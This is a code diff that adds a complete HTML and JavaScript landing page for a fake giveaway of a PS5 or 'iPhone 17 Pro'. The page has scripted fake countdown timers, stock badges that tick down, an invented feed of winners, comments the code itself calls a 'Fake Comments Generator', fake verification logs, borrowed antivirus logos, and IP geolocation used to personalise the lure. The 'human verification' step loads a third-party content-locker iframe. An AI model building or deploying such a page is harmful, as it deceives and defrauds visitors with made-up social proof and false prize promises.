@@ -1,0 +1,430 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Global Tech Rewards | Limited Entry</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;800&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --ps5-blue: #0072ce;
+            --iphone-orange: #ff4500;
+        }
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #08080a;
+            color: white;
+            overflow-x: hidden;
+        }
+
+        .glass {
+            background: rgba(255, 255, 255, 0.03);
+            backdrop-filter: blur(12px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .step-content { display: none; }
+        .step-content.active { display: block; }
+
+        #activity-feed {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            z-index: 100;
+            pointer-events: none;
+        }
+
+        .activity-card {
+            background: rgba(15, 15, 20, 0.95);
+            border-left: 4px solid #3b82f6;
+            padding: 12px 20px;
+            border-radius: 8px;
+            margin-top: 10px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            animation: fadeInUp 0.5s ease-out, fadeOut 0.5s ease-in 4.5s forwards;
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-20px); }
+        }
+        .float { animation: float 4s ease-in-out infinite; }
+
+        .progress-bar {
+            height: 4px;
+            background: #222;
+            width: 100%;
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: 1000;
+        }
+        #progress-fill {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(to right, #0072ce, #ff4500);
+            transition: width 0.4s ease;
+        }
+
+        .color-dot.active {
+            outline: 3px solid #3b82f6;
+            outline-offset: 2px;
+        }
+        
+        .comment-box { border-bottom: 1px solid rgba(255,255,255,0.05); }
+
+        /* Locker Modal Styling */
+        #locker-overlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.9);
+            z-index: 9999;
+            align-items: center;
+            justify-content: center;
+            padding: 15px;
+        }
+        #locker-container {
+            width: 100%;
+            max-width: 500px;
+            height: 600px;
+            background: #111;
+            border-radius: 24px;
+            overflow: hidden;
+            border: 1px solid rgba(255,255,255,0.1);
+            position: relative;
+            box-shadow: 0 0 50px rgba(59, 130, 246, 0.3);
+        }
+    </style>
+</head>
+<body class="antialiased">
+
+    <div class="progress-bar"><div id="progress-fill"></div></div>
+
+    <!-- Live Activity Feed -->
+    <div id="activity-feed"></div>
+
+    <!-- Header -->
+    <header class="pt-10 pb-6 px-4 text-center">
+        <div class="inline-flex items-center gap-2 px-4 py-1 rounded-full bg-white/5 border border-white/10 text-[10px] font-bold tracking-widest uppercase text-gray-400 mb-4">
+            <span class="flex h-2 w-2">
+                <span class="animate-ping absolute inline-flex h-2 w-2 rounded-full bg-green-400 opacity-75"></span>
+                <span class="relative inline-flex rounded-full h-2 w-2 bg-green-500"></span>
+            </span>
+            <span id="user-count">542</span> USERS ONLINE | <span id="user-region" class="text-blue-400 uppercase">GLOBAL</span>
+        </div>
+        <h1 class="text-5xl md:text-7xl font-extrabold tracking-tighter italic leading-none">
+            MEGA<span class="text-blue-500">GIVE</span>AWAY
+        </h1>
+        <p class="text-gray-400 mt-4 font-medium uppercase text-xs tracking-[0.3em]">Exclusive International Rewards Program</p>
+        <div class="mt-4 inline-block glass px-4 py-2 rounded-lg">
+            <p class="text-sm">Selection ends in: <span id="timer" class="text-white font-mono font-bold">09:55</span></p>
+        </div>
+    </header>
+
+    <main class="max-w-6xl mx-auto px-4 py-10">
+        
+        <!-- STEP 1: DEVICE SELECTION -->
+        <div id="step-1" class="step-content active animate__animated animate__fadeIn">
+            <div class="grid md:grid-cols-2 gap-8">
+                <!-- PS5 Card -->
+                <div onclick="selectDevice('PS5 Slim')" class="glass rounded-3xl p-8 cursor-pointer hover:border-blue-500 transition-all group relative overflow-hidden">
+                    <div class="absolute top-4 right-4 bg-blue-600 text-[10px] font-bold px-3 py-1 rounded-full stock-badge uppercase">Only 4 Left</div>
+                    <div class="h-64 flex items-center justify-center">
+                        <img src="https://gmedia.playstation.com/is/image/SIEPDC/ps5-product-thumbnail-01-en-14sep21?$facebook$" class="h-full float object-contain" alt="PS5">
+                    </div>
+                    <h2 class="text-3xl font-black mt-6 uppercase italic">PlayStation 5</h2>
+                    <p class="text-gray-400">Disk Edition + Extra Controller</p>
+                    <button class="w-full mt-6 py-4 rounded-xl bg-blue-600 font-bold group-hover:bg-blue-500 transition-all shadow-lg">SELECT REWARD</button>
+                </div>
+
+                <!-- iPhone Card -->
+                <div onclick="selectDevice('iPhone 17 Pro')" class="glass rounded-3xl p-8 cursor-pointer hover:border-orange-500 transition-all group relative overflow-hidden">
+                    <div class="absolute top-4 right-4 bg-orange-600 text-[10px] font-bold px-3 py-1 rounded-full stock-badge uppercase">Only 2 Left</div>
+                    <div class="h-64 flex items-center justify-center">
+                        <img src="https://ee-cms-prd-cf.mobilitydevices.prod.digital-ent-int.bt.com/1-iPhone-17-pro-max-cosmic-orange-front-back.png" class="h-full float object-contain" alt="iPhone 17">
+                    </div>
+                    <h2 class="text-3xl font-black mt-6 text-orange-500 uppercase italic">iPhone 17 Pro</h2>
+                    <p class="text-gray-400">Titanium Orange | 1TB Storage</p>
+                    <button class="w-full mt-6 py-4 rounded-xl bg-orange-600 font-bold group-hover:bg-orange-500 transition-all shadow-lg">SELECT REWARD</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- STEP 2: CONFIGURATION -->
+        <div id="step-2" class="step-content animate__animated animate__fadeIn">
+            <div class="max-w-md mx-auto glass rounded-3xl p-8 text-center">
+                <h2 class="text-2xl font-bold mb-6 italic">Customize Your <span id="selected-device-name" class="text-blue-500 uppercase">Device</span></h2>
+                
+                <div class="text-left mb-6">
+                    <label class="text-[10px] font-bold text-gray-500 uppercase tracking-widest">Select Finish</label>
+                    <div class="flex gap-4 mt-3">
+                        <div onclick="pickColor(this)" class="color-dot w-10 h-10 rounded-full bg-white cursor-pointer active"></div>
+                        <div onclick="pickColor(this)" class="color-dot w-10 h-10 rounded-full bg-black border border-white/20 cursor-pointer"></div>
+                        <div onclick="pickColor(this)" class="color-dot w-10 h-10 rounded-full bg-orange-500 border border-white/20 cursor-pointer"></div>
+                    </div>
+                </div>
+
+                <div class="text-left mb-8">
+                    <label class="text-[10px] font-bold text-gray-500 uppercase tracking-widest">Package Tier</label>
+                    <select class="w-full bg-white/5 border border-white/10 p-4 rounded-xl mt-2 outline-none focus:border-blue-500 appearance-none text-sm">
+                        <option class="bg-black text-white">Standard Edition (Free)</option>
+                        <option class="bg-black text-white">Special Edition (Incl. 24mo Warranty)</option>
+                        <option class="bg-black text-white">Full Bundle (Incl. Accessories)</option>
+                    </select>
+                </div>
+
+                <button onclick="startLoading()" class="w-full py-5 bg-white text-black font-black rounded-xl hover:bg-gray-200 transition-all shadow-xl">CONFIRM DETAILS</button>
+            </div>
+        </div>
+
+        <!-- STEP 3: LOADING -->
+        <div id="step-3" class="step-content animate__animated animate__fadeIn">
+            <div class="max-w-md mx-auto text-center py-20">
+                <div class="relative w-24 h-24 mx-auto mb-8">
+                    <div class="absolute inset-0 border-4 border-blue-500/20 rounded-full"></div>
+                    <div class="absolute inset-0 border-4 border-blue-500 border-t-transparent rounded-full animate-spin"></div>
+                </div>
+                <h2 id="loading-text" class="text-2xl font-bold italic uppercase tracking-tighter">Initializing Request...</h2>
+                <p class="text-gray-500 mt-2 text-sm">Detecting security tokens in <span class="user-country text-blue-400">your region</span></p>
+                
+                <div class="mt-10 bg-white/5 rounded-2xl p-6 text-left font-mono text-xs space-y-2 border border-white/5">
+                    <div id="log-1" class="text-gray-400 opacity-0 italic">Connecting to secure server... <span class="text-green-500 font-bold">DONE</span></div>
+                    <div id="log-2" class="text-gray-400 opacity-0 italic">Checking stock availability... <span class="text-green-500 font-bold">AVAILABLE</span></div>
+                    <div id="log-3" class="text-gray-400 opacity-0 italic">Finalizing reservation... <span class="text-green-500 font-bold">SUCCESS</span></div>
+                </div>
+            </div>
+        </div>
+
+        <!-- STEP 4: FINAL CONVERSION -->
+        <div id="step-4" class="step-content animate__animated animate__zoomIn">
+            <div class="max-w-lg mx-auto glass rounded-[2.5rem] p-10 text-center border-2 border-green-500/50 relative shadow-2xl">
+                <div class="absolute -top-6 left-1/2 -translate-x-1/2 bg-green-500 text-white px-6 py-2 rounded-full font-black text-[10px] tracking-widest shadow-lg uppercase">Inventory Locked</div>
+                
+                <div class="w-20 h-20 bg-green-500 rounded-full flex items-center justify-center mx-auto mb-6 shadow-[0_0_30px_rgba(34,197,94,0.4)]">
+                    <svg class="w-10 h-10 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"></path></svg>
+                </div>
+                
+                <h2 class="text-3xl font-black mb-2 uppercase italic">Success!</h2>
+                <p class="text-gray-400 mb-8 leading-relaxed">
+                    We have reserved (1) <span class="text-white font-bold" id="final-item">Device</span> for you. 
+                    Due to high demand in <span class="text-blue-400 font-bold user-country">your area</span>, 
+                    please complete the final human verification to claim.
+                </p>
+                
+                <div class="flex items-center justify-center gap-3 mb-8 bg-red-500/10 py-3 rounded-xl border border-red-500/20">
+                    <div class="w-2 h-2 bg-red-500 rounded-full animate-pulse"></div>
+                    <p class="text-xs font-bold text-red-500 uppercase tracking-widest">Offer Expires In: <span id="verify-timer">04:59</span></p>
+                </div>
+                
+                <!-- VERIFY BUTTON -->
+                <button onclick="openLocker()" class="block w-full py-6 bg-gradient-to-r from-blue-600 to-blue-400 text-white font-black text-2xl rounded-2xl shadow-xl hover:scale-105 transition-transform uppercase italic tracking-tighter">VERIFY & CLAIM NOW</button>
+                
+                <div class="flex justify-center items-center gap-6 mt-10 grayscale opacity-40">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b3/Norton_LifeLock_logo.svg/1200px-Norton_LifeLock_logo.svg.png" class="h-6" alt="Norton">
+                    <img src="https://www.mcafee.com/content/dam/mcafee/corp/logo/mcafee-logo-red.png" class="h-6" alt="McAfee">
+                </div>
+                <p class="text-[10px] text-gray-500 mt-6 uppercase tracking-widest font-bold italic">Human Verification Required</p>
+            </div>
+        </div>
+
+        <!-- Social Proof Comments -->
+        <section class="mt-20 max-w-2xl mx-auto border-t border-white/10 pt-10">
+            <h3 class="text-xl font-bold mb-8 flex items-center gap-2 italic uppercase">
+                <svg class="w-5 h-5 text-blue-500" fill="currentColor" viewBox="0 0 20 20"><path d="M2 5a2 2 0 012-2h7a2 2 0 012 2v4a2 2 0 01-2 2H9l-3 3v-3H4a2 2 0 01-2-2V5z"></path><path d="M15 7v2a4 4 0 01-4 4H9.828l-1.766 1.767c.28.149.599.233.938.233h2l3 3v-3h2a2 2 0 012-2V9a2 2 0 01-2-2h-1z"></path></svg>
+                Community Feedback
+            </h3>
+            <div id="comments-container" class="space-y-6"></div>
+        </section>
+
+    </main>
+
+    <!-- THE LOCKER POPUP -->
+    <div id="locker-overlay">
+        <div id="locker-container">
+            <div class="bg-blue-600 p-4 text-center font-bold text-sm tracking-widest uppercase italic">
+                Verification Required
+            </div>
+            <!-- Iframe containing your specific locker link -->
+            <iframe src="https://lockedapp.space/cl/i/pqqj93" class="w-full h-full border-none" style="height: calc(100% - 52px);"></iframe>
+            
+            <!-- Close button for better UX (Optional) -->
+            <button onclick="closeLocker()" class="absolute top-2 right-4 text-white text-xl">&times;</button>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer class="text-center py-16 text-gray-600 text-[10px] border-t border-white/5 uppercase tracking-widest leading-loose">
+        <p>&copy; 2024 TechRewards Global. Distribution Center. This giveaway is not affiliated with Sony or Apple.</p>
+        <div class="flex justify-center gap-6 mt-4">
+            <a href="#" class="hover:text-white transition-colors">Privacy Policy</a>
+            <a href="#" class="hover:text-white transition-colors">Terms of Service</a>
+        </div>
+    </footer>
+
+    <script>
+        let selectedPrize = "";
+
+        // Function to open locker on the same page
+        function openLocker() {
+            document.getElementById('locker-overlay').style.display = 'flex';
+        }
+
+        // Function to close locker
+        function closeLocker() {
+            document.getElementById('locker-overlay').style.display = 'none';
+        }
+
+        // 1. IP Detection
+        async function detectLocation() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                document.getElementById('user-region').innerText = data.country_name.toUpperCase();
+                document.querySelectorAll('.user-country').forEach(el => el.innerText = data.country_name);
+            } catch (e) {
+                document.getElementById('user-region').innerText = "GLOBAL";
+            }
+        }
+        detectLocation();
+
+        // 2. Navigation
+        function selectDevice(name) {
+            selectedPrize = name;
+            document.getElementById('selected-device-name').innerText = name;
+            showStep(2);
+            updateProgress(33);
+        }
+
+        function showStep(stepNumber) {
+            document.querySelectorAll('.step-content').forEach(s => s.classList.remove('active'));
+            document.getElementById(`step-${stepNumber}`).classList.add('active');
+            window.scrollTo(0,0);
+        }
+
+        function updateProgress(percentage) {
+            document.getElementById('progress-fill').style.width = percentage + '%';
+        }
+
+        function pickColor(el) {
+            document.querySelectorAll('.color-dot').forEach(d => d.classList.remove('active'));
+            el.classList.add('active');
+        }
+
+        function startLoading() {
+            showStep(3);
+            updateProgress(66);
+            
+            const logs = [
+                { id: 'log-1', delay: 1000 },
+                { id: 'log-2', delay: 2000 },
+                { id: 'log-3', delay: 3000 }
+            ];
+
+            logs.forEach(log => {
+                setTimeout(() => {
+                    document.getElementById(log.id).classList.replace('opacity-0', 'animate__fadeInLeft');
+                }, log.delay);
+            });
+
+            setTimeout(() => {
+                document.getElementById('final-item').innerText = selectedPrize;
+                showStep(4);
+                updateProgress(100);
+                startVerificationTimer(300, document.querySelector('#verify-timer'));
+            }, 4500);
+        }
+
+        // 3. Dynamic Stock
+        setInterval(() => {
+            const badges = document.querySelectorAll('.stock-badge');
+            badges.forEach(badge => {
+                let count = parseInt(badge.innerText.replace(/\D/g, ''));
+                if (count > 1 && Math.random() > 0.8) {
+                    count--;
+                    badge.innerText = `ONLY ${count} LEFT`;
+                    badge.classList.add('animate__animated', 'animate__pulse');
+                }
+            });
+        }, 9000);
+
+        // 4. Live Activity simulation
+        const names = ["James W.", "Sarah M.", "Kevin L.", "Elena R.", "Marcus T.", "Tiffany P.", "Lucas G.", "Sophia K."];
+        const prizesList = ["PS5 Digital", "iPhone 17 Pro", "PS5 Bundle"];
+
+        function createActivity() {
+            const feed = document.getElementById('activity-feed');
+            const name = names[Math.floor(Math.random() * names.length)];
+            const prize = prizesList[Math.floor(Math.random() * prizesList.length)];
+            
+            const div = document.createElement('div');
+            div.className = 'activity-card';
+            div.innerHTML = `
+                <div class="w-8 h-8 rounded-full bg-gradient-to-tr from-blue-500 to-purple-500 flex-shrink-0 border border-white/20"></div>
+                <div>
+                    <p class="text-[11px] font-bold text-white">${name} just claimed a ${prize}</p>
+                    <p class="text-[9px] text-gray-500 italic">Verified • ${Math.floor(Math.random() * 59) + 1}s ago</p>
+                </div>
+            `;
+            feed.appendChild(div);
+            setTimeout(() => div.remove(), 5000);
+        }
+        setInterval(createActivity, 8000);
+
+        // 5. Timers
+        function startTimer(duration, display) {
+            let timer = duration, minutes, seconds;
+            setInterval(() => {
+                minutes = parseInt(timer / 60, 10);
+                seconds = parseInt(timer % 60, 10);
+                display.textContent = (minutes < 10 ? "0" + minutes : minutes) + ":" + (seconds < 10 ? "0" + seconds : seconds);
+                if (--timer < 0) timer = duration;
+            }, 1000);
+        }
+
+        function startVerificationTimer(duration, display) {
+            let timer = duration, minutes, seconds;
+            const intv = setInterval(() => {
+                minutes = parseInt(timer / 60, 10);
+                seconds = parseInt(timer % 60, 10);
+                display.textContent = (minutes < 10 ? "0" + minutes : minutes) + ":" + (seconds < 10 ? "0" + seconds : seconds);
+                if (--timer < 0) clearInterval(intv);
+            }, 1000);
+        }
+        startTimer(600, document.querySelector('#timer'));
+
+        // 6. Fake Comments Generator
+        const commentData = [
+            { user: "TechGamer_99", text: "Got my PS5 tracking number! Verification was fast on my phone." },
+            { user: "Sarah_Designs", text: "I was skeptical about the iPhone 17 but it just got verified! Can't wait!" },
+            { user: "Markus_V", text: "Process was easy, just had to complete one quick task for the bot check." }
+        ];
+
+        const commentContainer = document.getElementById('comments-container');
+        commentData.forEach(c => {
+            commentContainer.innerHTML += `
+                <div class="comment-box pb-6">
+                    <div class="flex items-center gap-3 mb-2">
+                        <div class="w-8 h-8 rounded-full bg-white/10 border border-white/5"></div>
+                        <span class="text-sm font-bold italic">${c.user}</span>
+                        <span class="text-[9px] bg-blue-500/20 text-blue-400 px-2 py-0.5 rounded uppercase font-bold tracking-tighter">Verified Winner</span>
+                    </div>
+                    <p class="text-sm text-gray-400 leading-relaxed">${c.text}</p>
+                </div>
+            `;
+        });
+
+        // 7. Random User Counter
+        setInterval(() => {
+            const count = document.getElementById('user-count');
+            let current = parseInt(count.innerText);
+            count.innerText = current + (Math.random() > 0.5 ? 1 : -1);
+        }, 3000);
+    </script>
+</body>
+</html>
